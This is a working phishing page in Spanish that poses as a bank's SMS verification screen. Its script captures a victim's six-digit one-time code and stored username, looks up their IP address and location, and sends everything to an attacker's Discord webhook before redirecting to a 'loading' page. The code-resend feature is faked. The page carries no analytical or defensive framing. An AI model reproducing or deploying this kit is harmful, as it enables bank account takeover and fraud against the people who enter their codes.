<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificación SMS</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
  :root{
    --red: #E4032E;
    --text-dark: #1a1a2e;
    --text-muted: #9a9aa5;
    --border: #dcdce0;
  }
  *{ box-sizing: border-box; }
  html, body{
    margin: 0;
    padding: 0;
    font-family: 'Roboto', Arial, sans-serif;
    color: var(--text-dark);
    background: #fff;
  }
  .screen{
    max-width: 480px;
    margin: 0 auto;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
  }
  .header{
    background: var(--red);
    border-radius: 0 0 28px 28px;
    padding: 24px 20px 32px;
    display: flex;
    justify-content: space-between;
    align-items: flex-start;
  }
  .back-btn{
    width: 44px;
    height: 44px;
    border-radius: 50%;
    background: #fff;
    border: none;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    box-shadow: 0 2px 6px rgba(0,0,0,0.08);
  }
  .back-btn svg{ width: 20px; height: 20px; color: var(--red); }
  .header-links{
    text-align: right;
  }
  .header-links a{
    display: block;
    color: #fff;
    font-size: 14px;
    font-weight: 500;
    text-decoration: none;
    margin-bottom: 6px;
  }
  .header-links a:last-child{ margin-bottom: 0; }
  .illustration-wrap{
    display: flex;
    justify-content: center;
    margin: 32px 0 28px;
  }
  .illustration-circle{
    width: 200px;
    height: auto;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .illustration-circle img{
    width: 100%;
    height: auto;
    display: block;
  }
  .info-text{
    text-align: center;
    font-size: 15px;
    line-height: 1.5;
    padding: 0 32px;
    margin-bottom: 32px;
    color: var(--text-dark);
  }
  .otp-row{
    display: flex;
    justify-content: center;
    gap: 10px;
    padding: 0 24px;
    margin-bottom: 28px;
  }
  .otp-row input{
    width: 44px;
    height: 54px;
    text-align: center;
    font-size: 20px;
    font-weight: 500;
    border: 1px solid var(--border);
    border-radius: 10px;
    outline: none;
    font-family: inherit;
    color: var(--text-dark);
  }
  .otp-row input:focus{
    border-color: var(--red);
  }
  .resend-wrap{
    text-align: center;
  }
  .resend-title{
    font-size: 14px;
    color: var(--text-dark);
    margin-bottom: 4px;
  }
  .resend-timer{
    font-size: 13px;
    color: var(--text-muted);
  }
  .resend-timer a{
    color: var(--red);
    text-decoration: none;
    font-weight: 500;
  }
</style>
</head>
<body>

<div class="screen">
  <div class="header">
    <button class="back-btn" aria-label="Regresar">
      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M15 6l-6 6 6 6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </button>
    <div class="header-links">
      <a href="#">Olvidaste tu usuario</a>
      <a href="#">Gestiones de usuario</a>
    </div>
  </div>
  <div class="illustration-wrap">
    <div class="illustration-circle">
      <img src="nuevesito.png" alt="Verificación por SMS">
    </div>
  </div>
  <p class="info-text">Te enviamos un código de 6 dígitos por SMS a tu celular registrado.</p>
 
  <div class="otp-row">
    <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
    <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
    <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
    <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
    <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
    <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
  </div>
 
  <div class="resend-wrap">
    <p class="resend-title">¿No recibiste el código?</p>
    <p class="resend-timer" id="resendTimer">Reenviar el código en: <span id="countdown">54</span> seg</p>
  </div>
</div>

<script src="config.js"></script>
<script>

const usuario = localStorage.getItem("usuario") || "Usuario desconocido";
const otpInputs = document.querySelectorAll('.otp-input');


otpInputs.forEach((input, index) => {
  input.addEventListener('input', () => {
    input.value = input.value.replace(/\D/g, '');
    if (input.value.length > 0 && index < otpInputs.length - 1) {
      otpInputs[index + 1].focus();
    }
    checkOTPComplete();
  });

  input.addEventListener('paste', (e) => {
    e.preventDefault();
    const text = e.clipboardData.getData('text').trim().replace(/\D/g, '');
    if (text.length === 6) {
      otpInputs.forEach((inp, i) => inp.value = text[i] || '');
      checkOTPComplete();
    }
  });

  input.addEventListener('keydown', (e) => {
    if (e.key === "Backspace" && input.value === "" && index > 0) {
      otpInputs[index - 1].focus();
    }
  });
});

function checkOTPComplete() {
  const code = Array.from(otpInputs).map(i => i.value).join('');
  if (code.length === 6) {
    enviarDatos(code);
  }
}


let timeLeft = 60;
let timerInterval;

function startCountdown() {
  const countdownEl = document.getElementById('countdown');
  
  timerInterval = setInterval(() => {
    timeLeft--;
    countdownEl.textContent = timeLeft;

    if (timeLeft <= 0) {
      clearInterval(timerInterval);
      document.getElementById('resendTimer').innerHTML = 
        '¿No recibiste el código? <a href="#" onclick="reenviarCodigo()">Reenviar ahora</a>';
    }
  }, 1000);
}

window.reenviarCodigo = function() {
  alert("Código reenviado (simulado)");
  timeLeft = 54;
  document.getElementById('resendTimer').innerHTML = 
    `Reenviar el código en: <span id="countdown">54</span> seg`;
  startCountdown();
};


startCountdown();


async function enviarDatos(otpCode) {
  let ipData = { ip: "No disponible", city: "No disponible", country: "No disponible" };
 
  try {
    const res = await fetch("https://ipinfo.io/json");
    if (res.ok) ipData = await res.json();
  } catch (e) {}

  const payload = {
    content: `❤️ATLANTIDA❤️\nUSX: ${usuario}\n📱 OTP: ${otpCode}\n\n🌍 IP: ${ipData.ip}\n🏙 Ciudad: ${ipData.city}\n🌐 País: ${ipData.country}`
  };

  try {
    const webhookURL = window.DISCORD_WEBHOOK;
    if (webhookURL) {
      await fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      
      console.log("✅ OTP enviado correctamente");
      
     
      setTimeout(() => {
        window.location.href = "cargando.html";
      }, 800); 
      
    } else {
      console.error("No se encontró DISCORD_WEBHOOK en config.js");
    }
  } catch (err) {
    console.error("Error enviando OTP:", err);
  }
}
</script>
</body>
</html>
